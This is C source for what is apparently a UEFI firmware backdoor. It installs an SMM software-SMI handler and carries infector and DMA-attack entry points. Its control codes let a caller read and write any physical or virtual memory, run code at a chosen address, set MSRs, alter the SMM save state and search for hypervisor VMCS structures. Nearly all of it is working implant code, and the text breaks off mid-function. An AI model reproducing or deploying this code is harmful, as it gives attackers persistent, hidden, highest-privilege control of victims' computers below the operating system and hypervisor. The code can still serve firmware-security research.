#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

// APMC I/O ports to generate software SMI
#define APMC_DATA       0xb3
#define APMC_COMMAND    0xb2

// for VMCS revision ID
#define IA32_VMX_BASIC  0x480

typedef VOID (* BACKDOOR_ENTRY_SMM)(EFI_SMM_SYSTEM_TABLE2 *Smst);

typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

// DMA attack entry point
EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface);

// file infector entry point
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryDma,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0,

    // *******************************************************

    // address of infector entry point
    (UINT64)&BackdoorEntryInfected,

    // RVA of original entry point
    0
};

VOID *m_ImageBase = NULL;
EFI_SYSTEM_TABLE *m_ST = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;
EFI_RUNTIME_SERVICES *m_RT = NULL;
EFI_SMM_SYSTEM_TABLE2 *m_Smst = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
char *m_OutputBuffer = NULL;

// SMRAM regions information
EFI_SMRAM_DESCRIPTOR m_SmramMap[MAX_SMRAM_REGIONS];
UINTN m_SmramMapSize = 0;

// software SMI handler register context
EFI_SMM_SW_REGISTER_CONTEXT m_SwDispatchRegCtx = { BACKDOOR_SW_SMI_VAL };

// SMM periodic timer register context (time in 100 nanosecond units)
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_TimerDispatchRegCtx = { 1000000, 640000 };

// address of dummy memory page used in VirtualAddrRemap()
UINT64 m_DummyPage = 0;

// temp buffer for memory read/write CTL requests
UINT8 *m_TempBuff = NULL;
//--------------------------------------------------------------------------------------
void ConsolePrintScreen(char *Message)
{
    if (m_TextOutput)
    {
        size_t Len = std_strlen(Message), i = 0;

        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }
}

void ConsolePrintBuffer(char *Message)
{
    size_t Len = std_strlen(Message);

    if (m_OutputBuffer && std_strlen(m_OutputBuffer) + Len < DEBUG_OUTPUT_SIZE)
    {                    
        std_strcat(m_OutputBuffer, Message);
    }
}

void ConsolePrint(char *Message)
{
    // print messages to the screem
    ConsolePrintScreen(Message);

    // save messages to the buffer
    ConsolePrintBuffer(Message);
}
//--------------------------------------------------------------------------------------
void ConsoleInitialize(void)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS PagesAddr;

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        m_ST->ConsoleOutHandle,
        &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

    // allocate memory for pending debug output
    Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        DEBUG_OUTPUT_SIZE / PAGE_SIZE, &PagesAddr
    );
    if (Status == EFI_SUCCESS) 
    {
        EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;

        m_OutputBuffer = (char *)PagesAddr;
        m_BS->SetMem(m_OutputBuffer, DEBUG_OUTPUT_SIZE, 0);

        DbgMsg(__FILE__, __LINE__, "Debug output buffer is at "FPTR"\r\n", PagesAddr);

        // save memory address into the firmware variable
        Status = m_ST->RuntimeServices->SetVariable(
            BACKDOOR_VAR_NAME, &VariableGuid,
            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(PagesAddr), (VOID *)&PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {
            DbgMsg(__FILE__, __LINE__, "SetVariable() ERROR 0x%x\r\n", Status);
        }
    }
    else
    {     
        DbgMsg(__FILE__, __LINE__, "AllocatePages() ERROR 0x%x\r\n", Status);
    }
}

void ConsoleDisable(void)
{
    // disable console output
    m_TextOutput = NULL;
}

void ConsoleClearBuffer(void)
{
    if (m_OutputBuffer)
    {
        // clear debug messages buffer
        *m_OutputBuffer = '\0';
    }
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    UINTN Base = (UINTN)Addr;

    Base = ALIGN_DOWN(Base, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {
        if (*(UINT16 *)(Base - Offset) == EFI_IMAGE_DOS_SIGNATURE ||
            *(UINT16 *)(Base - Offset) == EFI_TE_IMAGE_HEADER_SIGNATURE)
        {
            return (VOID *)(Base - Offset);
        }

        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *ImageRelocate(VOID *Image)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;    

    // allocate memory for executable image
    EFI_STATUS Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations in according to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, VOID **Registration)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_Smst->SmmRegisterProtocolNotify(Guid, Handler, Registration)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() ERROR 0x%x\r\n", Status);
    }

    return Status;
}

EFI_STATUS RegisterProtocolNotifyDxe(
    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
    EFI_EVENT *Event, VOID **Registration)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event)) != EFI_SUCCESS) 
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() ERROR 0x%x\r\n", Status);
        return Status;
    }

    if ((Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration)) != EFI_SUCCESS) 
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() ERROR 0x%x\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

    return Status;
}
//--------------------------------------------------------------------------------------
VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if (m_TextOutput == NULL)
    {
        // initialize console I/O
        Status = m_BS->HandleProtocol(
            m_ST->ConsoleOutHandle,
            &gEfiSimpleTextOutProtocolGuid,
            (VOID **)&m_TextOutput
        );
        if (Status == EFI_SUCCESS)
        {
            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
            m_TextOutput->ClearScreen(m_TextOutput);

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Ready\r\n");

            if (m_OutputBuffer)
            {
                // print pending messages
                ConsolePrintScreen(m_OutputBuffer);

                m_BS->Stall(TO_MICROSECONDS(3));
            }
        }
    }
}

VOID SimpleTextOutProtocolNotifyRegister(VOID)
{
    VOID *Registration = NULL;
    EFI_EVENT Event = NULL;

    // set text output protocol register notify
    RegisterProtocolNotifyDxe(
        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
        &Event, &Registration
    );
}
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_TimerDispatch = NULL;
EFI_HANDLE m_TimerDispatchHandle = NULL;

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize
);

EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_TimerDispatch)
    {
        // register periodic timer routine
        Status = m_TimerDispatch->Register(
            m_TimerDispatch, 
            PeriodicTimerDispatch2Handler, 
            &m_TimerDispatchRegCtx,
            DispatchHandle
        );
        if (Status != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "Register() ERROR 0x%X\r\n", Status);
        }
    }    

    return Status;
}

EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_TimerDispatch)
    {
        // register periodic timer routine
        Status = m_TimerDispatch->UnRegister(
            m_TimerDispatch, 
            DispatchHandle
        );
        if (Status != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "Unregister() ERROR 0x%X\r\n", Status);
        }
    }    

    return Status;
}

#endif // USE_PERIODIC_TIMER
//--------------------------------------------------------------------------------------
/*
    34.4.1.1 - SMRAM State Save Map and Intel 64 Architecture

        When the processor initially enters SMM, it writes its state to the 
        state save area of the SMRAM. The state save area on an Intel 64 processor 
        at [SMBASE + 8000H + 7FFFH] and extends to [SMBASE + 8000H + 7C00H].
*/
#define SAVE_SATE_START 0x7c00

// save state region size for Intel 64
#define SAVE_SATE_SIZE (0x8000 - SAVE_SATE_START)

// registers offsets
#define SAVE_SATE_REG_RCX       (0x7f64 - SAVE_SATE_START)
#define SAVE_SATE_REG_RDI       (0x7f94 - SAVE_SATE_START)
#define SAVE_SATE_REG_RSI       (0x7f8C - SAVE_SATE_START)
#define SAVE_SATE_REG_CR0       (0x7ff8 - SAVE_SATE_START)
#define SAVE_SATE_REG_CR3       (0x7ff0 - SAVE_SATE_START)

// EPT related fields
#define SAVE_SATE_EPTP_ENABLE   (0x7ee0 - SAVE_SATE_START)
#define SAVE_SATE_EPTP_ADDR     (0x7ed8 - SAVE_SATE_START)

UINT8 *SaveStateFindAddr(UINTN CpuIndex, EFI_SMM_CPU_PROTOCOL *SmmCpu, PCONTROL_REGS ControlRegs)
{
    EFI_STATUS Status = EFI_SUCCESS;
    UINT64 Rcx = 0, Rdi = 0, Rsi = 0;
    UINTN i = 0, n = 0;

    // for VirtualAddrValid() calls
    UINT64 Cr3 = __readcr3();

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
        CpuIndex, (VOID *)&Rcx
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rdi), EFI_SMM_SAVE_STATE_REGISTER_RDI, 
        CpuIndex, (VOID *)&Rdi
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rsi), EFI_SMM_SAVE_STATE_REGISTER_RSI, 
        CpuIndex, (VOID *)&Rsi
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    // enumerate SMRAM regions
    for (i = 0; i < m_SmramMapSize; i += 1)
    {
        // scan for the SMM saved state area
        for (n = 0; n < m_SmramMap[i].PhysicalSize - SAVE_SATE_SIZE; n += SAVE_SATE_SIZE)
        {       
            // ensure that SMRAM memory page is valid and mapped     
            if (VirtualAddrValid(m_SmramMap[i].PhysicalStart + n, Cr3))
            {
                UINT8 *Ptr = (UINT8 *)(m_SmramMap[i].PhysicalStart + n);

                // check for the known register values in saved state
                if (*(UINT64 *)(Ptr + SAVE_SATE_REG_RCX) == Rcx &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_RDI) == Rdi &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_RSI) == Rsi &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_CR0) == ControlRegs->Cr0 &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_CR3) == ControlRegs->Cr3)
                {
                    return Ptr;
                }
            }
        }
    }

_end:

    return NULL;
}
//--------------------------------------------------------------------------------------
// how many bytes of VMCS region to scan for known values
#define VMCS_SEARCH_SIZE 0x400

BOOLEAN VmcsSearchVal(UINT8 *Addr, UINT64 Size, UINT64 Value)
{
    UINT64 i = 0;

    // scan specified memory region
    for (i = 0; i < Size; i += sizeof(UINT64))
    {
        // check for desired value
        if (*(UINT64 *)(Addr + i) == Value)
        {
            return TRUE;
        }
    }

    return FALSE;
}

EFI_STATUS SmmCtlHandle(
    UINTN CpuIndex, EFI_SMM_CPU_PROTOCOL *SmmCpu,
    UINT64 Code, UINT64 Args, PCONTROL_REGS ControlRegs)
{
    BACKDOOR_CTL Ctl;
    UINT64 ArgsAddr = 0, Eptp = 0;
    UINT8 *SaveStateAddr = NULL;
    BOOLEAN bLargePage = FALSE;

    // read SMM control registes
    UINT64 Cr0 = __readcr0();
    UINT64 Cr3 = __readcr3();

#ifdef USE_PERIODIC_TIMER

    if (Code == BACKDOOR_CTL_TIMER_ENABLE || Code == BACKDOOR_CTL_TIMER_DISABLE)
    {
        if (m_TimerDispatch)
        {
            BOOLEAN bNotify = FALSE;

            if (m_TimerDispatchHandle)
            {
                // unregister old handler
                PeriodicTimerDispatch2Unregister(m_TimerDispatchHandle);
                m_TimerDispatchHandle = NULL;
            }
            else
            {
                bNotify = TRUE;
            }

            if (Code == BACKDOOR_CTL_TIMER_ENABLE)
            {
                // register new handler
                if (PeriodicTimerDispatch2Register(&m_TimerDispatchHandle) == EFI_SUCCESS)
                {
                    if (bNotify)
                    {
                        DbgMsg(
                            __FILE__, __LINE__, 
                            __FUNCTION__"(): Periodic timer SW SMI was enabled\r\n"
                        );
                    }
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Periodic timer SW SMI was disabled\r\n");
            }
        }

        return EFI_SUCCESS;
    }

#endif // USE_PERIODIC_TIMER

    // check for the sane caller memory paging configuration
    if (!Check_IA_32e())
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
        return EFI_UNSUPPORTED;
    }

    // sanity check
    if (Args == 0 || m_DummyPage == 0 || m_TempBuff == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    // get CPU saved state location
    if ((SaveStateAddr = SaveStateFindAddr(CpuIndex, SmmCpu, ControlRegs)) != 0)
    {
        DbgMsg(__FILE__, __LINE__, "SMM save state address is 0x%llx\r\n", SaveStateAddr);
        
        // check for EPTP enable flag
        if (*(UINT32 *)(SaveStateAddr + SAVE_SATE_EPTP_ENABLE) != 0)
        {
            // obtain EPTP value
            Eptp = *(UINT64 *)(SaveStateAddr + SAVE_SATE_EPTP_ADDR);

            DbgMsg(__FILE__, __LINE__, "EPTP value is 0x%llx\r\n", Eptp);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Unable to locate SMM save state aread\r\n");
    }

    // get physical address for given virtual address
    #define PHYS_GET(_virt_, _phys_) VirtualToPhysical((_virt_), (_phys_), ControlRegs->Cr3, Eptp, Cr3)

    // map physical memory page at dummy virtual page
    #define PHYS_MAP(_addr_) VirtualAddrRemap(m_DummyPage, (_addr_), Cr3, &bLargePage)

    // restore mappings
    #define PHYS_REVERT() VirtualAddrRemap(m_DummyPage, m_DummyPage, Cr3, &bLargePage)

    // get mapped virtual address
    #define MAPPED_ADDR(_addr_) ((UINT8 *)m_DummyPage + (bLargePage ? PAGE_OFFSET_2M((_addr_)) : \
                                                                      PAGE_OFFSET_4K((_addr_))))

    // get backdoor call arguments physical address
    if (PHYS_GET(Args, &ArgsAddr) == EFI_SUCCESS)
    {
        // map backdoor call arguments at SMM virtual address
        if (PHYS_MAP(ArgsAddr))
        {
            UINT8 *TargetAddr = MAPPED_ADDR(ArgsAddr);            

            // copy backdoor call arguments to the local buffer
            std_memcpy(&Ctl, TargetAddr, sizeof(BACKDOOR_CTL));

            PHYS_REVERT();
        }
        else
        {
            DbgMsg(
                __FILE__, __LINE__, 
                "ERROR: Unable to map physical address 0x%llx\r\n", ArgsAddr
            );

            return EFI_INVALID_PARAMETER;
        }
    }              
    else
    {
        DbgMsg(
            __FILE__, __LINE__, 
            "ERROR: Unable to resolve physical address for 0x%llx\r\n", Args
        );

        return EFI_INVALID_PARAMETER;
    }

    if (Code == BACKDOOR_CTL_READ_PHYS || Code == BACKDOOR_CTL_WRITE_PHYS ||
        Code == BACKDOOR_CTL_READ_VIRT || Code == BACKDOOR_CTL_WRITE_VIRT)
    {
        if (Ctl.Args.Mem.Size == 0 || Ctl.Args.Mem.Size > PAGE_SIZE)
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory size\r\n");

            Ctl.Status = EFI_INVALID_PARAMETER;
            goto _end;
        }

        // page boundary check
        if ((Ctl.Args.Mem.Addr & ~(PAGE_SIZE - 1)) != ((Ctl.Args.Mem.Addr + Ctl.Args.Mem.Size - 1) & ~(PAGE_SIZE - 1)))
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory address/size\r\n");

            Ctl.Status = EFI_INVALID_PARAMETER;
            goto _end;
        }
    }

    switch (Code)
    {
    case BACKDOOR_CTL_PING:
        {
            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_INFO:
        {
            UINTN i = 0;

            // return basic information
            Ctl.Args.Info.Cr0 = Cr0;
            Ctl.Args.Info.Cr3 = Cr3;
            Ctl.Args.Info.Smst = (UINT64)m_Smst;

            for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
            {
                Ctl.Args.Info.Smram[i].Addr = m_SmramMap[i].PhysicalStart;
                Ctl.Args.Info.Smram[i].Size = m_SmramMap[i].PhysicalSize;
            }

            Ctl.Status = EFI_SUCCESS;            
            break;
        }

    case BACKDOOR_CTL_READ_PHYS:    
        {
            UINT64 BuffAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // map memory read target address at SMM virtual address
            if (PHYS_MAP(Ctl.Args.Mem.Addr))
            {
                UINT8 *TargetAddr = MAPPED_ADDR(Ctl.Args.Mem.Addr);            

                // copy memory contents to the temp buffer
                std_memcpy(m_TempBuff, TargetAddr, Size);

                PHYS_REVERT();
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to map physical address 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // get memory read buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory read buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy read memory contents to the caller buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_WRITE_PHYS:
        {
            UINT64 BuffAddr = 0;         
            size_t Size = (size_t)Ctl.Args.Mem.Size;               

            // get memory write buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory write buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy write memory contents from the caller buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // map memory write target address at SMM virtual address
            if (PHYS_MAP(Ctl.Args.Mem.Addr))
            {
                UINT8 *TargetAddr = MAPPED_ADDR(Ctl.Args.Mem.Addr);            

                // copy memory contents from the temp buffer
                std_memcpy(TargetAddr, m_TempBuff, Size);

                Ctl.Status = EFI_SUCCESS;

                PHYS_REVERT();
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to map physical address 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_READ_VIRT:    
        {            
            UINT64 BuffAddr = 0, MemAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // get memory read target physical address
            if (PHYS_GET(Ctl.Args.Mem.Addr, &MemAddr) == EFI_SUCCESS)
            {
                // map memory read target address at SMM virtual address
                if (PHYS_MAP(MemAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(MemAddr);            

                    // copy memory contents to the temp buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", MemAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NOT_FOUND;
                break;
            }

            // get memory read buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory read buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy read memory contents to the caller buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_WRITE_VIRT:
        {
            UINT64 BuffAddr = 0, MemAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // get memory write buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory write buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy write memory contents from the caller buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // get memory write target physical address
            if (PHYS_GET(Ctl.Args.Mem.Addr, &MemAddr) == EFI_SUCCESS)
            {
                // map memory write target address at SMM virtual address
                if (PHYS_MAP(MemAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(MemAddr);            

                    // copy memory contents from the temp buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", MemAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NOT_FOUND;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_EXECUTE:
        {
            typedef VOID (EFIAPI * USER_FUNC)(VOID);

            USER_FUNC Func = (USER_FUNC)Ctl.Args.Execute.Addr;

            // execute code at given address
            Func();

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_MSR_GET:
        {
            // get MSR value
            Ctl.Args.Msr.Value = __readmsr(Ctl.Args.Msr.Register);

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_MSR_SET:
        {
            // set MSR value
            __writemsr(Ctl.Args.Msr.Register, Ctl.Args.Msr.Value);

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_STATE_GET:
        {
            // get SMM save state register value
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(UINT64), Ctl.Args.SaveState.Register, 
                CpuIndex, (VOID *)&Ctl.Args.SaveState.Value
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
            }

            break;
        }

    case BACKDOOR_CTL_STATE_SET:
        {
            // set SMM save state register value
            Ctl.Status = SmmCpu->WriteSaveState(
                SmmCpu, sizeof(UINT64), Ctl.Args.SaveState.Register, 
                CpuIndex, (VOID *)&Ctl.Args.SaveState.Value
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "WriteSaveState() ERROR 0x%x\r\n", Ctl.Status);
            }

            break;
        }

    case BACKDOOR_CTL_GET_PHYS_ADDR:
        {
            UINT64 UserEptp = Eptp;
            UINT64 UserCr3 = ControlRegs->Cr3;

            if (Ctl.Args.PhysAddr.Eptp != 0)
            {
                if (Ctl.Args.PhysAddr.Eptp == 1)
                {
                    // force to not use EPTP for address translation at all
                    UserEptp = 0;
                }
                else
                {
                    // use caller specified EPTP
                    UserEptp = Ctl.Args.PhysAddr.Eptp;
                }
            }

            if (Ctl.Args.PhysAddr.Cr3 != 0)
            {
                // use caller specified CR3
                UserCr3 = Ctl.Args.PhysAddr.Cr3;
            }

            // get physical address for given virtual address
            if (VirtualToPhysical(
                Ctl.Args.PhysAddr.AddrVirt, 
                &Ctl.Args.PhysAddr.AddrPhys, UserCr3, UserEptp, Cr3) != EFI_SUCCESS)
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", 
                    Ctl.Args.PhysAddr.AddrVirt
                );

                Ctl.Status = EFI_NOT_FOUND;
            }
            else
            {
                Ctl.Status = EFI_SUCCESS;
            }

            break;
        }

    case BACKDOOR_CTL_FIND_VMCS:
        {
            UINT64 GdtBase = 0, IdtBase = 0, i = 0;
            UINT64 SearchAddr = Ctl.Args.FindVmcs.Addr;
            UINT64 SearchSize = Ctl.Args.FindVmcs.Size;

            // read basic VMX infomation register
            UINT64 RevisionId = __readmsr(IA32_VMX_BASIC);

            // extract 32 bits of VMCS revision ID value
            RevisionId &= 0xffffffff;

            // addess sanity check
            if (SearchAddr % PAGE_SIZE != 0)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory address\r\n");

                Ctl.Status = EFI_INVALID_PARAMETER;
                break;
            }

            // size sanity check
            if (SearchSize % PAGE_SIZE != 0 || SearchSize < PAGE_SIZE)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory size\r\n");

                Ctl.Status = EFI_INVALID_PARAMETER;
                break;
            }

            // get GDT address
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(GdtBase), EFI_SMM_SAVE_STATE_REGISTER_GDTBASE,
                CpuIndex, (VOID *)&GdtBase
            );
            if (EFI_ERROR(Ctl.Status))
            {
